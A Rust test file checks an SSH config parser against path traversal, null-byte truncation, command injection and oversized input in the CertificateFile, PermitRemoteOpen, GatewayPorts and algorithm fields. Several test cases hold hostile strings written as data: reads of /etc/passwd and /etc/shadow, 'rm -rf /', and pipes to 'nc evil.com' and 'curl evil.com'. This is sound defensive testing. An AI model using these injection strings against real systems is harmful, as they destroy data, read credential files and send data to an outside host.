// Security tests for certificate authentication features
use super::*;

#[cfg(test)]
mod certificate_path_security_tests {
    use super::*;

    #[test]
    fn test_reject_path_traversal_in_certificate() {
        // Test that path traversal attempts are rejected
        let content = r#"
Host example.com
    CertificateFile ../../../etc/passwd
"#;
        let result = crate::ssh::ssh_config::SshConfig::parse(content);
        assert!(result.is_err(), "Should reject path traversal in CertificateFile");
        let err = result.unwrap_err().to_string();
        assert!(err.contains("directory traversal") || err.contains(".."),
                "Error should mention path traversal: {}", err);
    }

    #[test]
    fn test_reject_tilde_traversal_in_certificate() {
        // Test that tilde expansion with traversal is handled safely
        let content = r#"
Host example.com
    CertificateFile ~/../../etc/shadow
"#;
        let result = crate::ssh::ssh_config::SshConfig::parse(content);
        // This should either reject or expand safely without allowing traversal
        if result.is_ok() {
            let config = result.unwrap();
            let cert_path = &config.hosts[0].certificate_files[0];
            let path_str = cert_path.to_string_lossy();
            assert!(!path_str.contains("etc/shadow"),
                    "Should not allow traversal to /etc/shadow: {}", path_str);
            assert!(!path_str.contains("../"),
                    "Should not contain traversal sequences after expansion: {}", path_str);
        }
    }

    #[test]
    fn test_reject_null_byte_in_certificate() {
        // Test that null bytes are rejected (prevent truncation attacks)
        let content = "Host example.com\n    CertificateFile /tmp/cert\0/../../etc/passwd";
        let result = crate::ssh::ssh_config::SshConfig::parse(content);
        assert!(result.is_err(), "Should reject null bytes in CertificateFile");
    }

    #[test]
    fn test_reject_command_injection_in_certificate() {
        // Test that command injection attempts are rejected
        let test_cases = vec![
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "|cat /etc/passwd",
            ";cat /etc/passwd",
            "&&cat /etc/passwd",
            "||cat /etc/passwd",
        ];

        for payload in test_cases {
            let content = format!("Host example.com\n    CertificateFile {}", payload);
            let result = crate::ssh::ssh_config::SshConfig::parse(&content);
            // These should either be rejected or treated as literal filenames
            if result.is_ok() {
                let config = result.unwrap();
                if !config.hosts.is_empty() && !config.hosts[0].certificate_files.is_empty() {
                    let cert_path = &config.hosts[0].certificate_files[0];
                    let path_str = cert_path.to_string_lossy();
                    // Should be treated as literal filename, not executed
                    assert!(path_str.contains(payload) || path_str.contains("cat"),
                            "Command injection payload should be treated literally: {}", path_str);
                }
            }
        }
    }

    #[test]
    fn test_multiple_certificate_files_memory() {
        // Test that multiple certificate files don't cause excessive memory usage
        let mut content = String::from("Host example.com\n");
        for i in 0..10000 {
            content.push_str(&format!("    CertificateFile ~/.ssh/cert_{}.pub\n", i));
        }

        let result = crate::ssh::ssh_config::SshConfig::parse(&content);
        assert!(result.is_ok(), "Should handle many certificate files");
        let config = result.unwrap();
        assert_eq!(config.hosts[0].certificate_files.len(), 10000);
    }
}

#[cfg(test)]
mod permit_remote_open_security_tests {
    use super::*;

    #[test]
    fn test_unbounded_permit_remote_open() {
        // Test that unbounded PermitRemoteOpen entries don't cause DoS
        let mut content = String::from("Host example.com\n");
        for i in 0..100000 {
            content.push_str(&format!("    PermitRemoteOpen host{}:808{}\n", i, i % 10));
        }

        let start = std::time::Instant::now();
        let result = crate::ssh::ssh_config::SshConfig::parse(&content);
        let duration = start.elapsed();

        assert!(result.is_ok(), "Should handle many PermitRemoteOpen entries");
        assert!(duration.as_secs() < 5, "Parsing should complete within 5 seconds");

        let config = result.unwrap();
        assert_eq!(config.hosts[0].permit_remote_open.len(), 100000);
    }

    #[test]
    fn test_permit_remote_open_injection() {
        // Test that PermitRemoteOpen doesn't allow injection
        let test_cases = vec![
            "localhost:8080;rm -rf /",
            "$(whoami):8080",
            "`id`:8080",
            "localhost:8080|nc evil.com 1234",
            "localhost:8080&&curl evil.com",
        ];

        for payload in test_cases {
            let content = format!("Host example.com\n    PermitRemoteOpen {}", payload);
            let result = crate::ssh::ssh_config::SshConfig::parse(&content);
            assert!(result.is_ok(), "Should parse injection attempts as literal values");
            let config = result.unwrap();
            // Should be stored as literal string, not executed
            assert_eq!(config.hosts[0].permit_remote_open[0], payload);
        }
    }
}

#[cfg(test)]
mod gateway_ports_security_tests {
    use super::*;

    #[test]
    fn test_gateway_ports_validation() {
        // Test that only valid GatewayPorts values are accepted
        let valid_values = vec!["yes", "no", "clientspecified"];
        for value in valid_values {
            let content = format!("Host example.com\n    GatewayPorts {}", value);
            let result = crate::ssh::ssh_config::SshConfig::parse(&content);
            assert!(result.is_ok(), "Should accept valid value: {}", value);
            let config = result.unwrap();
            assert_eq!(config.hosts[0].gateway_ports, Some(value.to_string()));
        }

        // Test invalid values
        let invalid_values = vec![
            "maybe",
            "true",
            "false",
            "1",
            "0",
            "YES",  // Case sensitivity
            "No",   // Case sensitivity
            "$(whoami)",
            "../../../etc/passwd",
        ];

        for value in invalid_values {
            let content = format!("Host example.com\n    GatewayPorts {}", value);
            let result = crate::ssh::ssh_config::SshConfig::parse(&content);
            if value == "YES" || value == "No" {
                // Should be case-insensitive
                assert!(result.is_ok(), "Should handle case variations");
                let config = result.unwrap();
                let stored_value = config.hosts[0].gateway_ports.as_ref().unwrap();
                assert!(stored_value == "yes" || stored_value == "no");
            } else {
                assert!(result.is_err(), "Should reject invalid value: {}", value);
            }
        }
    }
}

#[cfg(test)]
mod algorithm_parsing_security_tests {
    use super::*;

    #[test]
    fn test_algorithm_buffer_overflow() {
        // Test extremely long algorithm lists don't cause buffer overflow
        let long_algo = "a".repeat(1000000); // 1MB string
        let content = format!("Host example.com\n    CASignatureAlgorithms {}", long_algo);

        let result = crate::ssh::ssh_config::SshConfig::parse(&content);
        // Should either handle gracefully or reject if too long
        if result.is_err() {
            let err = result.unwrap_err().to_string();
            assert!(err.contains("exceeds maximum") || err.contains("too long"),
                    "Should mention size limit: {}", err);
        } else {
            let config = result.unwrap();
            // If accepted, should be stored correctly
            assert!(!config.hosts[0].ca_signature_algorithms.is_empty());
        }
    }

    #[test]
    fn test_algorithm_injection() {
        // Test that algorithm lists don't allow command injection
        let test_cases = vec![
            "ssh-ed25519,$(whoami)",
            "ssh-rsa;rm -rf /",
            "ssh-rsa|nc evil.com",
            "ssh-rsa`id`",
            "ssh-rsa&&curl evil.com",
        ];

        for payload in test_cases {
            let content = format!("Host example.com\n    HostbasedAcceptedAlgorithms {}", payload);
            let result = crate::ssh::ssh_config::SshConfig::parse(&content);
            assert!(result.is_ok(), "Should parse as literal algorithm names");
            let config = result.unwrap();
            // Should be parsed as algorithm names, not executed
            let algos = &config.hosts[0].hostbased_accepted_algorithms;
            assert!(!algos.is_empty());
            // Check that special characters are preserved as literals
            let joined = algos.join(",");
            assert!(joined.contains("whoami") || joined.contains("rm") ||
                    joined.contains("nc") || joined.contains("id") ||
                    joined.contains("curl"),
                    "Should preserve injection attempt as literal: {}", joined);
        }
    }
}

#[cfg(test)]
mod configuration_merge_performance_tests {
    use super::*;

    #[test]
    fn test_deep_merge_performance() {
        // Create deeply nested configuration merges
        let mut content = String::new();
        for i in 0..1000 {
            content.push_str(&format!("Host *.level{}.example.com\n", i));
            content.push_str(&format!("    CertificateFile ~/.ssh/cert_{}.pub\n", i));
            content.push_str(&format!("    PermitRemoteOpen host{}:808{}\n", i, i % 10));
        }

        let start = std::time::Instant::now();
        let config = crate::ssh::ssh_config::SshConfig::parse(&content).unwrap();
        let parse_time = start.elapsed();

        // Test merge performance
        let start = std::time::Instant::now();
        let merged = config.find_host_config("test.level999.level500.level100.example.com");
        let merge_time = start.elapsed();

        assert!(parse_time.as_secs() < 5, "Parsing should be fast");
        assert!(merge_time.as_millis() < 100, "Merging should be fast");

        // Verify merge worked correctly
        assert!(!merged.certificate_files.is_empty());
    }
}